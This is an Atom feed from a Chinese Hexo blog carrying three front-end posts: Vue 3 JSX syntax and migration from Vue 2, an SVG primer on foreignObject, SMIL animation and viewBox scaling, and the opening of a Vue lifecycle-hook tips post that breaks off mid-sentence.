<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>默默默默燃</title>
  
  <subtitle>路漫漫其修远兮，吾将上下而求索</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://zhanghao-web.github.io/"/>
  <updated>2020-07-07T08:17:24.962Z</updated>
  <id>https://zhanghao-web.github.io/</id>
  
  <author>
    <name>张白告丶</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>拥抱Vue3系列之jsx语法</title>
    <link href="https://zhanghao-web.github.io/2020/07/07/Vue/%E6%8B%A5%E6%8A%B1Vue3%E7%B3%BB%E5%88%97%E4%B9%8Bjsx%E8%AF%AD%E6%B3%95/"/>
    <id>https://zhanghao-web.github.io/2020/07/07/Vue/拥抱Vue3系列之jsx语法/</id>
    <published>2020-07-07T05:48:26.000Z</published>
    <updated>2020-07-07T08:17:24.962Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://juejin.im/post/5f01d7886fb9a07e6835601a?utm_source=gold_browser_extension#heading-6" target="_blank" rel="noopener">原文地址</a></p><p>在过去的一年中，Vue 团队一直都在开发 Vue.js 的下一个主要版本，就在 6 月底，尤大更新同步了 Vue 3 及其周边生态的状态(<a href="https://github.com/vuejs/rfcs/issues/183" target="_blank" rel="noopener">Vue 3: mid 2020 status update</a>)。</p><pre><code class="js">if (isTrue(&quot;I am planning to use Vue 3 for a new project&quot;)) {  if (isTrue(&quot;I need IE11 support&quot;)) {    await IE11CompatBuild() // July 2020  }  if (isTrue(&quot;RFCs are too dense, I need an easy-to-read guide&quot;)) {    await migrationGuide() // July 2020  }  if (isTrue(&quot;I&#39;d rather wait until it&#39;s really ready&quot;) {      await finalRelease() // Targeting early August 2020  })  run(`npm init vite-app hello-vue3`)  return}</code></pre><p>我们可以看到，如果一切顺利的话，预计在 8 月份，Vue 3 的正式版本就可以和我们见面了，目前距离发布正式版还有一定的差距，还要做一些兼容性的工作。同时还会提供对 IE11 的支持。</p><p>Vue 3 为了达到更快、更小、更易于维护、更贴近原生、对开发者更友好的目的，在很多方面进行了重构：</p><blockquote><p>全面拥抱 TypeScript<br>重构 complier<br>重构 Virtual DOM<br>…</p></blockquote><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这是该系列文章的第一篇，后续会持续更新，覆盖 <code>Vue 3</code>生态常用库。</p><p>JSX 是一个小众群体使用开发方式，第一篇以 JSX 为切入点，目标是让大多数开发 Vue 的同学也对 JSX 有一定的认知，在用 Vue 开发复杂应用时，也能有更加灵活的方式。<br>比如当开始写一个只能通过 <code>level prop</code> 动态生成标题 (heading) 的组件时，你可能很快想到这样实现：</p><pre><code class="js">&lt;script type=&quot;text/x-template&quot; id=&quot;anchored-heading-template&quot;&gt;  &lt;h1 v-if=&quot;level === 1&quot;&gt;    &lt;slot&gt;&lt;/slot&gt;  &lt;/h1&gt;  &lt;h2 v-else-if=&quot;level === 2&quot;&gt;    &lt;slot&gt;&lt;/slot&gt;  &lt;/h2&gt;  &lt;h3 v-else-if=&quot;level === 3&quot;&gt;    &lt;slot&gt;&lt;/slot&gt;  &lt;/h3&gt;&lt;/script&gt;</code></pre><p>这里用模板并不是最好的选择，在每一个级别的标题中重复书写了 <code>&lt;slot&gt;&lt;/slot&gt;</code>，不够优雅。</p><p>如果尝试用 JSX 来写，代码就会变得简单很多。</p><pre><code class="js">const App = {  render() {    const tag = `h${this.level}`    return &lt;tag&gt;{this.$slots.default}&lt;/tag&gt;  }}</code></pre><p>看过 <a href="https://github.com/vueComponent/ant-design-vue" target="_blank" rel="noopener">Ant Design Vue</a> 源码 (下面简称为 <code>antdv</code>) 的同学应该知道， <code>antdv</code> 的底层是基于 JSX 来实现的，也是 Vue 生态中使用 JSX 的深度用户。</p><p>antd 为了尽快的兼容 Vue 3，和 Vue 官方展开合作，于是有了 <a href="https://github.com/vueComponent/jsx" target="_blank" rel="noopener">@ant-design-vue/babel-plugin-jsx</a>。</p><h2 id="Vue-JSX-简介"><a href="#Vue-JSX-简介" class="headerlink" title="Vue JSX 简介"></a>Vue JSX 简介</h2><p>对于使用 React 的开发者来说，JSX 再熟悉不过了，但是如果你是一个 Vue 的重度用户，可能对 JSX 不是特别熟悉，甚至听到有同学说没有 template 的 Vue 项目没有灵魂。</p><p>先来看下面一段代码：</p><pre><code class="js">const el = &lt;div&gt;Vue 3&lt;/div&gt;;</code></pre><p>这段代码既不是 HTML 也不是字符串，被称之为 JSX，是 JavaScript 的扩展语法。JSX 可能会使人联想到模板语法，但是它具备 Javascript 的完全编程能力。</p><p>看到这里可能会有疑问，不少同学可能会以为 JSX 是 React 中特有的，其实不然。</p><p>大多数同学都知道，我们平常在 <code>.vue</code> 文件中开发的代码，实际上会被 vue-loader 处理，但可能少数同学去看过我们手把手写出的代码，会变编译成啥样。</p><p>有兴趣的同学可以戳这个地址来看下。<a href="https://vue-template-explorer.netlify.app/" target="_blank" rel="noopener">vue-template-explorer</a> (因为众所周知的原因，可能访问略慢)</p><pre><code class="js">&lt;div id=&quot;app&quot;&gt;{{ msg }}&lt;/div&gt;</code></pre><pre><code class="js">function render() {  with(this) {    return _c(&#39;div&#39;, {      attrs: {        &quot;id&quot;: &quot;app&quot;      }    }, [_v(_s(msg))])  }}</code></pre><p>观察上述代码我们发现，到运行阶段实际上都是 render 函数在执行。Vue 推荐在绝大多数情况下使用 template 来创建你的 HTML。然而在一些场景中，就需要使用 render 函数，它比 template 更加灵活。</p><p>写过 render 函数的同学可能深有体会，书写复杂的 render 函数异常痛苦，而且难以维护，非常容易被称之为 “祖传代码”。好在2.0 的官方提供了一个 <a href="https://link.zhihu.com/?target=https%3A//github.com/vuejs/babel-plugin-transform-vue-jsx">Babel 插件</a>，可以将更接近于模板语法的 JSX 转译成 JavaScript。</p><p>使用过 React 的同学对于如何写 JSX 语法一定非常熟悉了，然而，Vue 2 中 的 JSX 写法和 React 还是有一些略微的区别。React 中所有传递的数据都挂在顶层。</p><pre><code class="js">const App = &lt;A className=&quot;x&quot; style={style} onChange={onChange} /&gt;</code></pre><p>Vue 2 中，仅仅属性就有三种：<code>组件属性 props，普通 html 属性attrs，DOM 属性 domProps</code>。想要更多了解如何在 Vue 2 中写 JSX 语法，可以看这篇，<a href="https://zhuanlan.zhihu.com/p/37920151" target="_blank" rel="noopener">在 Vue 中使用 JSX 的正确姿势</a>。</p><h2 id="Vue-3-中对-JSX-带来的改变"><a href="#Vue-3-中对-JSX-带来的改变" class="headerlink" title="Vue 3 中对 JSX 带来的改变"></a>Vue 3 中对 JSX 带来的改变</h2><h3 id="属性传递"><a href="#属性传递" class="headerlink" title="属性传递"></a>属性传递</h3><p>Vue 3 中，属性这块的传递和 React 类似，意味这不需要再传递 props，attrs 这些属性。</p><pre><code class="js">// before{  class: [&#39;foo&#39;, &#39;bar&#39;],  style: { color: &#39;red&#39; },  attrs: { id: &#39;foo&#39; },  domProps: { innerHTML: &#39;&#39; },  on: { click: foo },  key: &#39;foo&#39;}// after{  class: [&#39;foo&#39;, &#39;bar&#39;],  style: { color: &#39;red&#39; },  id: &#39;foo&#39;,  innerHTML: &#39;&#39;,  onClick: foo,  key: &#39;foo&#39;}</code></pre><h3 id="指令改版"><a href="#指令改版" class="headerlink" title="指令改版"></a>指令改版</h3><p>Vue 3 把大多数全局 API 和 内部 helper 移到了 ES 模块中导出(譬如 <code>v-model、transition、teleport</code>)，从而使得 Vue 3 在增加了很多新特性之后，基线的体积反而小了。</p><p><code>v-model、v-show</code> 这些 API 全部通过模块导出的方式来引入</p><blockquote><p>基线体积： 无法舍弃的代码体积</p></blockquote><p>我们来看一段非常简单的代码 <code>&lt;input v-model=&quot;x&quot; /&gt;</code>，在 Vue 2 和 Vue 3 中的编译结果有何不同。</p><pre><code class="js">// Vue 2 beforefunction render() {  with(this) {    return _c(&#39;input&#39;, {      directives: [{        name: &quot;model&quot;,        rawName: &quot;v-model&quot;,        value: (x),        expression: &quot;x&quot;      }],      domProps: {        &quot;value&quot;: (x)      },      on: {        &quot;input&quot;: function ($event) {          if ($event.target.composing) return;          x = $event.target.value        }      }    })  }}</code></pre><pre><code class="js">// Vue 3 afterimport { vModelText as _vModelText, createVNode as _createVNode, withDirectives as _withDirectives, openBlock as _openBlock, createBlock as _createBlock } from &quot;vue&quot;export function render(_ctx, _cache) {  return _withDirectives((_openBlock(), _createBlock(&quot;input&quot;, {    &quot;onUpdate:modelValue&quot;: $event =&gt; (_ctx.x = $event)  }, null, 8 /* PROPS */, [&quot;onUpdate:modelValue&quot;])), [    [_vModelText, _ctx.x]  ])}</code></pre><p>可以看到在 Vue 3 中，对各个 API 做了更加细致的拆分，理想状态下，用户可以在构建时利用摇树优化 (<code>tree-shaking</code>) 去掉框架中不需要的特性，只保留自己用到的特性。</p><p>模版编译器会生成适合做 <code>tree-shaking</code> 的代码，不需要使用者去关心如何去做，这部分的改动同样需要在 JSX 写法中实现。</p><p>模板编译器中增加了 <code>PatchFlag</code>，在 JSX 的编译过程同样也做了处理，性能会有提升，但是考虑到 JSX 的灵活性，做了一些兼容处理，该功能还在测试阶段。</p><h2 id="从-Vue-2-到-Vue-3-的过渡"><a href="#从-Vue-2-到-Vue-3-的过渡" class="headerlink" title="从 Vue 2 到 Vue 3 的过渡"></a>从 Vue 2 到 Vue 3 的过渡</h2><p>Vue 3 虽然引入了一部分破坏性的更新，但对于绝大多数 Vue 2 的 API 还是兼容的。那么同样的，我们也要尽可能让使用 JSX 的用户通过最小的成本升级到 Vue 3，这是一个核心的目标。<br>写这篇文章的时候，antdv 已经使用 <a href="https://github.com/vueComponent/ant-design-vue" target="_blank" rel="noopener">@ant-design-vue/babel-plugin-jsx</a> 重构了大约 70% 的功能，预计会在 Vue 3 正式版之前发布测试版，大概率会是东半球最快兼容 Vue 3 的企业级组件库。</p><h3 id="Vue-3-JSX-的-API-设计"><a href="#Vue-3-JSX-的-API-设计" class="headerlink" title="Vue 3 JSX 的 API 设计"></a>Vue 3 JSX 的 API 设计</h3><ul><li>函数式组件</li></ul><pre><code class="js">const App = () =&gt; &lt;div&gt;Vue 3 JSX&lt;/div&gt;</code></pre><ul><li>普通组件</li></ul><pre><code class="js">const App = {  render() {    return &lt;div&gt;Vue 3.0&lt;/div&gt;  }}</code></pre><pre><code class="js">const App = defineComponent(() =&gt; {  const count = ref(0);  const inc = () =&gt; {    count.value++;  };  return () =&gt; (    &lt;div onClick={inc}&gt;      {count.value}    &lt;/div&gt;  )})</code></pre><ul><li>Fragment</li></ul><pre><code class="js">const App = () =&gt; (  &lt;&gt;    &lt;span&gt;I&#39;m&lt;/span&gt;    &lt;span&gt;Fragment&lt;/span&gt;  &lt;/&gt;)</code></pre><p>Fragment 参考 React 的写法，尽可能写起来更加方便。</p><ul><li>Attributes/Props</li></ul><pre><code class="js">const App = () =&gt; &lt;input type=&quot;email&quot; /&gt;const placeholderText = &#39;email&#39;const App = () =&gt; (  &lt;input    type=&quot;email&quot;    placeholder={placeholderText}  /&gt;)</code></pre><ul><li>指令</li></ul><blockquote><p>建议在 JSX 中使用驼峰 (vModel)，但是 v-model 也能用</p></blockquote><p><strong>v-show</strong></p><pre><code class="js">const App = {  data() {    return { visible: true };  },  render() {    return &lt;input vShow={this.visible} /&gt;;  },};</code></pre><p><strong>v-model</strong></p><blockquote><p>修饰符：使用 (_) 代替 (.) (vModel_trim={this.test})</p></blockquote><pre><code class="js">export default { data: () =&gt; ({   test: &#39;Hello World&#39;, }), render() {   return (     &lt;&gt;       &lt;input type=&quot;text&quot; vModel_trim={this.test} /&gt;       {this.test}     &lt;/&gt;   ) },}</code></pre><p><strong>自定义指令</strong></p><pre><code class="js">const App = {  directives: { antRef },  setup() {    return () =&gt; (      &lt;a        vAntRef={(ref) =&gt; { this.ref = ref; }}      /&gt;    );  },}</code></pre><ul><li>插槽</li></ul><p>关于指令、插槽最终的 API 还在讨论中，有想法的可以去留言。<a href="https://github.com/vuejs/jsx/issues/141" target="_blank" rel="noopener">Vue 3 JSX Design</a></p><h3 id="Vue-2-的-JSX-写法如何快速迁移到-Vue-3"><a href="#Vue-2-的-JSX-写法如何快速迁移到-Vue-3" class="headerlink" title="Vue 2 的 JSX 写法如何快速迁移到 Vue 3"></a>Vue 2 的 JSX 写法如何快速迁移到 Vue 3</h3><p>由于 antdv 的底层基本上都是基于 JSX 来写的，想要快速迁移到 Vue 3，就必须有一个比较好的插件来支持，这也是为什么会有这个插件的原因。当然在实现过程中也踩了很多坑。</p><p>目前用法和 Vue 2 的语法大多数是一致的，为了帮助更快迁移，在插件中做了针对旧 VNode 格式的兼容层，这里只能兼容一部分写法，以及部分语法的兼容会增加运行时的性能开销，所以我们希望能够将我们的经验分享给大家，让大家少走弯路！</p><pre><code class="js">{  &quot;plugins&quot;: [&quot;@ant-design-vue/babel-plugin-jsx&quot;, { &quot;transformOn&quot;: true, &quot;compatibleProps&quot;: true }]}</code></pre><ul><li>transformOn</li></ul><p>针对 Vue 2 中 <code>on: { click: xx }</code> 写法的兼容，在运行时中会转为 <code>onClick: xxx</code>。</p><ul><li>compatibleProps</li></ul><p>上文提到 Vue 3 对属性的传递做了变更，<code>props、attrs</code> 这些都不存在了，因此如果设置了这个属性为 true，在运行时也会被解构到第一层的属性中。</p><p>需要注意的一点，目前一旦开启这两个属性，在 <code>createVNode</code> 的第二个参数，都会包一个 <code>compatibleProps</code> 和 <code>transformOn</code> 方法，所以酌情开启这两个参数。对于使用 Vue 2 的 JSX 同学，如果没有使用到比较”不为人知“ 的 API的情况下，都可以快速得迁移。</p><p>那么 antdv 又是如何做迁移的呢？考虑到 antdv 是个组件库，都包一层 <code>compatibleProps</code> 势必不太优雅，因此没有选择开启这个两个开关。这里插一句，目前 antdv 的迁移还在进行中，相关的进度都在这个 issue 里面（<a href="https://github.com/vueComponent/ant-design-vue/issues/1913" target="_blank" rel="noopener">Vue 3 支持</a>），有兴趣的同学可以关注下，提一些 PR 过去。</p><p>对于 props 的迁移工作比较简单，只需要把原有分散在 <code>props、on、attrs</code> 中的值直接铺开即可。</p><pre><code class="js"> const vcUploadProps = {-  props: {-    ...this.$props,-   prefixCls,-    beforeUpload: this.reBeforeUpload,-  },-  on: {-    start: this.onStart,-    error: this.onError,-    progress: this.onProgress,-    success: this.onSuccess,-    reject: this.onReject,- },+  ...this.$props,+  prefixCls,+  beforeUpload: this.reBeforeUpload,+  onStart: this.onStart,+  onError: this.onError,+  onProgress: this.onProgress,+  onSuccess: this.onSuccess,+  onReject: this.onReject,+  ref: &#39;uploadRef&#39;,+  attrs: this.$attrs,+  ...this.$attrs,};</code></pre><p>但是关于 <code>inheritAttrs</code> 有个较为底层的变动，需要开发者根据实际情况去修改。<a href="https://cn.vuejs.org/v2/api/index.html#inheritAttrs" target="_blank" rel="noopener">什么是inheritAttrs?</a> 在 Vue 2 中，这个选项不影响 class 和 style 绑定，但是在 Vue 3 中会影响到。因此可能在属性的传递上，需要额外对这两个参数做处理。</p><p>在事件的处理上，我们建议在 props 中声明，这样对后续的开发更加易维护，可以很直观地从 props 看出我这个组件到底会传递哪些事件。值得一提的是，在 props 中声明的事件，也可以通过 emit 来触发。例如声明了 onClick 事件，仍然可以使用 emit(‘click’)。</p><p>Vue 3 对 context 的 API 也做了改动，一般如果不是复杂的组件，不会涉及到这个 API。这部分的改动可以看原先 <code>Vue Compositon API</code> 的相关文档，<a href="https://composition-api.vuejs.org/api.html#dependency-injection" target="_blank" rel="noopener">Dependency Injection</a>，注意一点，在 setup 中取不到 this。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://juejin.im/post/5f01d7886fb9a07e6835601a?utm_source=gold_browser_extension#heading-6&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文地址
      
    
    </summary>
    
      <category term="Vue" scheme="https://zhanghao-web.github.io/categories/Vue/"/>
    
    
      <category term="Vue" scheme="https://zhanghao-web.github.io/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>svg科普篇-向强大的svg迈进</title>
    <link href="https://zhanghao-web.github.io/2020/07/01/Tools/svg%E7%A7%91%E6%99%AE%E7%AF%87-%E5%90%91%E5%BC%BA%E5%A4%A7%E7%9A%84svg%E8%BF%88%E8%BF%9B/"/>
    <id>https://zhanghao-web.github.io/2020/07/01/Tools/svg科普篇-向强大的svg迈进/</id>
    <published>2020-07-01T01:29:27.000Z</published>
    <updated>2020-07-02T01:15:37.106Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天在掘金上突然看到京东凹凸实验室发布的一篇<a href="https://juejin.im/post/5ef1a698f265da02ce2181d0?utm_source=gold_browser_extension" target="_blank" rel="noopener">《向强大的svg迈进》</a>，想到前几个月项目老大非得让我从svg图标换成iconfont字体图标，最后在我耐心给老大讲了svg的未来，对比了iconfont与普通png的区别后，老大妥协了，让我说服其他成员，代码保持一致就行，:( ，没办法，又得给其他同事讲下。所以今天为了科普svg，写来这篇</p><blockquote><p>SVG 即 <code>Scalable Vector Graphics</code> 可缩放矢量图形，使用XML格式定义图形。<br><a href="https://juejin.im/post/5ef1a698f265da02ce2181d0?utm_source=gold_browser_extension" target="_blank" rel="noopener">原文地址</a></p></blockquote><h2 id="SVG印象"><a href="#SVG印象" class="headerlink" title="SVG印象"></a>SVG印象</h2><p>SVG 的应用十分广泛，得益于 SVG 强大的各种特性。</p><h3 id="矢量"><a href="#矢量" class="headerlink" title="矢量"></a>矢量</h3><p>可利用 SVG 矢量的特点，描出深圳地铁的轮廓：</p><p><img src="https://user-gold-cdn.xitu.io/2020/6/23/172dff28ae2bb2f0?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="metro"></p><h3 id="iconfont"><a href="#iconfont" class="headerlink" title="iconfont"></a>iconfont</h3><p>SVG 可依据一定的规则，转成 iconfont 使用：</p><p><img src="https://user-gold-cdn.xitu.io/2020/6/23/172dff28e7152486?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="iconfont"></p><h3 id="foreignObject"><a href="#foreignObject" class="headerlink" title="foreignObject"></a>foreignObject</h3><p>利用 SVG 的 <code>foreignObject</code> 标签实现截图功能，原理：<code>foreignObject</code> 内部嵌入 HTML 元素：</p><pre><code class="js">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;    &lt;foreignObject width=&quot;120&quot; height=&quot;60&quot;&gt;        &lt;p style=&quot;font-size:20px;margin:0;&quot;&gt;凹凸实验室 欢迎您&lt;/p&gt;    &lt;/foreignObject&gt;&lt;/svg&gt;</code></pre><p>截图实现流程：</p><p>1.首先声明一个基础的 svg 模版，这个模版需要一些基础的描述信息，最重要的，它要有 <code>&lt;foreignObject&gt;&lt;/foreignObject&gt;</code> 这对标签；<br>2.将要渲染的 DOM 模版模版嵌入 <code>foreignObject</code> 即可；<br>3.利用 Blob 构建 svg 对象；<br>4.利用 <code>URL.createObjectURL(svg)</code> 取出 URL。</p><h3 id="SVG-SMIL"><a href="#SVG-SMIL" class="headerlink" title="SVG SMIL"></a>SVG SMIL</h3><p>由于微信编辑器不允许嵌入 <code>&lt;style&gt;&lt;script&gt;&lt;a&gt;</code> 标签，利用SVG SMIL 可进行微信公众号极具创意的图文排版设计，包括动画与交互。<br>但是也要注意，标签里不允许有id，否则会被过滤或替换掉。</p><p>点击 “凹凸实验室” 后，围绕 “凹凸实验室” 中心旋转 360度，点击0.5秒后 出现 <a href="https://aotu.io/" target="_blank" rel="noopener">aotu.io/</a> ，动画只运行一次。</p><p>下图为 GIF循环演示：</p><p><img src="https://user-gold-cdn.xitu.io/2020/6/23/172dff2914fb651d?imageslim" alt="demo"></p><p>代码如下：</p><pre><code class="js">&lt;svg width=&quot;360&quot; height=&quot;300&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;    &lt;g&gt;        &lt;!-- 点击后 运行transform旋转动画，restart=&quot;never&quot;表示只运行一次 --&gt;        &lt;animateTransform attributeName=&quot;transform&quot; type=&quot;rotate&quot; begin=&quot;click&quot; dur=&quot;0.5s&quot; from=&quot;0 100 80&quot; to=&quot;360 100 80&quot;  fill=&quot;freeze&quot; restart=&quot;never&quot; /&gt;        &lt;g&gt;            &lt;text font-family=&quot;microsoft yahei&quot; font-size=&quot;20&quot; x=&quot;50&quot; y=&quot;80&quot;&gt;                凹凸实验室            &lt;/text&gt;        &lt;/g&gt;        &lt;g style=&quot;opacity: 0;&quot;&gt;            &lt;!-- 同一个初始位置以及大致的宽高，触发点击事件 --&gt;            &lt;text font-family=&quot;microsoft yahei&quot; font-size=&quot;20&quot; x=&quot;50&quot; y=&quot;80&quot;&gt;https://aotu.io/&lt;/text&gt;            &lt;!-- 点击后 运行transform移动动画，改变文本的位置 --&gt;            &lt;animateTransform attributeName=&quot;transform&quot; type=&quot;translate&quot; begin=&quot;click&quot; dur=&quot;0.1s&quot; to=&quot;0 40&quot;  fill=&quot;freeze&quot; restart=&quot;never&quot; /&gt;            &lt;!-- 点击0.5秒后 运行opacity显示动画 --&gt;            &lt;animate attributeName=&quot;opacity&quot; begin=&quot;click+0.5s&quot; from=&quot;0&quot; to=&quot;1&quot; dur=&quot;0.5s&quot; fill=&quot;freeze&quot; restart=&quot;never&quot; /&gt;        &lt;/g&gt;    &lt;/g&gt;&lt;/svg&gt;</code></pre><h2 id="SVG-实现非比例缩放"><a href="#SVG-实现非比例缩放" class="headerlink" title="SVG 实现非比例缩放"></a>SVG 实现非比例缩放</h2><p>我们熟知的 <code>iconfont</code>，可通过改变字体大小缩放，但是这是 <strong>比例缩放</strong>，那如何实现 SVG 的<strong>非比例缩放</strong>呢？ 如下图所示，<code>如何将 一只兔子 非比例缩放？</code></p><p><img src="https://user-gold-cdn.xitu.io/2020/6/23/172dff2972d16d14?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="demo"></p><p>划重点：<strong>实现非比例缩放主要涉及三个知识点：<code>viewport、viewBox和preserveAspectRatio</code>，<code>viewport 与viewBox</code> 结合可实现缩放的功能，<code>viewBox 与 preserveAspectRatio</code> 结合可实现非比例的功能</strong>。</p><h3 id="viewport"><a href="#viewport" class="headerlink" title="viewport"></a>viewport</h3><p><code>viewport</code> 表示SVG可见区域的大小。 <code>viewport</code> 就像是我们的显示器屏幕大小，超出区域则隐藏，原点位于左上角，x 轴水平向右，y 轴垂直向下。</p><p><img src="https://user-gold-cdn.xitu.io/2020/6/23/172dff29abb23727?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="demo"></p><p>通过类似CSS的属性 <code>width、height</code> 指定视图大小：</p><pre><code class="js">&lt;svg width=&quot;400&quot; height=&quot;200&quot;&gt;&lt;/svg&gt;</code></pre><h3 id="viewBox"><a href="#viewBox" class="headerlink" title="viewBox"></a>viewBox</h3><p>viewBox值有4个数字：<code>x, y, width, height</code> 。 其中 x：左上角横坐标，y：左上角纵坐标，width：宽度，height：高度。<br>原点默认位于左上角，x 轴水平向右，y 轴垂直向下。</p><pre><code class="js">&lt;svg width=&quot;400&quot; height=&quot;200&quot; viewBox=&quot;0 0 200 100&quot;&gt;&lt;/svg&gt;</code></pre><p>显示器屏幕的画面，可以特写，可以全景，这就是 <code>viewBox</code>。 <code>viewBox</code> 可以想象成截屏工具选中的那个框框，和 <code>viewport</code> 作用的结果就是 把框框中的截屏内容再次在 显示器 中全屏显示。</p><p><img src="https://user-gold-cdn.xitu.io/2020/6/23/172dff29e1dee892?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="demo"></p><h3 id="preserveAspectRatio"><a href="#preserveAspectRatio" class="headerlink" title="preserveAspectRatio"></a>preserveAspectRatio</h3><p>上图的红色框框和蓝色框框，恰好和显示器的比例相同，如果是下图的绿色框框，怎样在显示器屏幕中显示呢?</p><p><img src="https://user-gold-cdn.xitu.io/2020/6/23/172dff2a1f0c94f7?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="demo"></p><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p><code>preserveAspectRatio</code> 作用的对象是 <code>viewBox</code>，使用方法如下：</p><pre><code class="js">preserveAspectRatio=&quot;[defer] &lt;align&gt; [&lt;meetOrSlice&gt;]&quot;// 例如 preserveAspectRatio=&quot;xMidYMid meet&quot;</code></pre><p>其中 <code>defer</code> 此时不是重点，暂且忽略，主要了解 <code>align</code> 和 <code>meetOrSlice</code> 的 用法：</p><p><code>align</code>：由两个名词组成，分别代表 <code>viewbox 与 viewport 的 x 方向、y方向</code>的对齐方式。</p><blockquote><p><code>meetOrSlice</code>：表示如何维持高宽的比例，有三个值 <code>meet</code>、<code>slice</code>、<code>none</code>。<br><code>meet</code> - 默认值，保持纵横比缩放 viewBox 适应 viewport，可能会有余留的空白。<br><code>slice</code> - 保持纵横比同时比例小的方向放大填满 viewport，超出的部分被剪裁掉。<br><code>none</code> - 扭曲纵横比以充分适应 viewport。</p></blockquote><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>例子1：<code>preserveAspectRatio=&quot;xMidYMid meet&quot;</code> 表示 绿色框框 与 显示器的 x 方向、y方向的 中心点 对齐；</p><p><img src="https://user-gold-cdn.xitu.io/2020/6/23/172dff2a71a181c0?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="demo"></p><p>例子2：<code>preserveAspectRatio=&quot;xMidYMin slice&quot;</code> 表示 绿色框框 与 显示器的 x 方向 中心点 对齐，Y 方向 上边缘对齐，保持比例放大填满 显示屏 后超出部分隐藏；</p><p><img src="https://user-gold-cdn.xitu.io/2020/6/23/172dff2aa4bade91?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="demo"></p><p>例子3：preserveAspectRatio=”xMidYMid slice” 表示 绿色框框 与 显示器的 x 方向、y方向的 中心点 对齐，保持比例放大填满显示屏 后超出部分隐藏；</p><p><img src="https://user-gold-cdn.xitu.io/2020/6/23/172dff2adcb56f90?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="demo"></p><p>例子4：preserveAspectRatio=”none” 不管三七二十一，随意缩放绿色框框，填满 显示屏即可；这就是非比例缩放的答案了。</p><p><img src="https://user-gold-cdn.xitu.io/2020/6/23/172dff2b10f609f4?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="demo"></p><h2 id="SVG-vs-Image-SVG-vs-Iconfont"><a href="#SVG-vs-Image-SVG-vs-Iconfont" class="headerlink" title="SVG vs Image, SVG vs Iconfont"></a>SVG vs Image, SVG vs Iconfont</h2><p>SVG vs Image, SVG vs Iconfont 对比文章地址 <a href="https://blog.csdn.net/cpongo3/article/details/90258990?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-7.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-7.nonecase" target="_blank" rel="noopener">原文地址</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;今天在掘金上突然看到京东凹凸实验室发布的一篇&lt;a href=&quot;https://juejin.im/post/5ef1a698f265da02
      
    
    </summary>
    
      <category term="Tools" scheme="https://zhanghao-web.github.io/categories/Tools/"/>
    
    
      <category term="Svg" scheme="https://zhanghao-web.github.io/tags/Svg/"/>
    
  </entry>
  
  <entry>
    <title>实战技巧，Vue原来还可以这样写</title>
    <link href="https://zhanghao-web.github.io/2020/06/24/Vue/%E5%AE%9E%E6%88%98%E6%8A%80%E5%B7%A7%EF%BC%8CVue%E5%8E%9F%E6%9D%A5%E8%BF%98%E5%8F%AF%E4%BB%A5%E8%BF%99%E6%A0%B7%E5%86%99/"/>
    <id>https://zhanghao-web.github.io/2020/06/24/Vue/实战技巧，Vue原来还可以这样写/</id>
    <published>2020-06-24T05:09:18.000Z</published>
    <updated>2020-06-24T05:41:08.057Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://juejin.im/post/5eef7799f265da02cd3b82fe?utm_source=gold_browser_extension" target="_blank" rel="noopener">原文地址</a></p><h2 id="hookEvent-原来可以这样监听组件生命周期"><a href="#hookEvent-原来可以这样监听组件生命周期" class="headerlink" title="hookEvent,原来可以这样监听组件生命周期"></a>hookEvent,原来可以这样监听组件生命周期</h2><h3 id="1-内部监听生命周期函数"><a href="#1-内部监听生命周期函数" class="headerlink" title="1. 内部监听生命周期函数"></a>1. 内部监听生命周期函数</h3><p>今天产品经理又给我甩过来一个需求，需要开发一个图表，拿到需求，瞄了一眼，然后我就去echarts官网复制示例代码了，复制完改了改差不多了，改完代码长这样</p><pre><code class="html">&lt;template&gt;  &lt;div class=&quot;echarts&quot;&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default {  mounted() {    this.chart = echarts.init(this.$el)    // 请求数据，赋值数据 等等一系列操作...    // 监听窗口发生变化，resize组件    window.addEventListener(&#39;resize&#39;, this.$_handleResizeChart)  },  updated() {    // 干了一堆活  },  created() {    // 干了一堆活  },  beforeDestroy() {    // 组件销毁时，销毁监听事件    window.removeEventListener(&#39;resize&#39;, this.$_handleResizeChart)  },  methods: {    $_handleResizeChart() {      this.chart.resize()    },    // 其他一堆方法  }}&lt;/script&gt;</code></pre><p>功能写完开开心心的提测了，测试没啥问题，产品经理表示做的很棒。然而<code>code 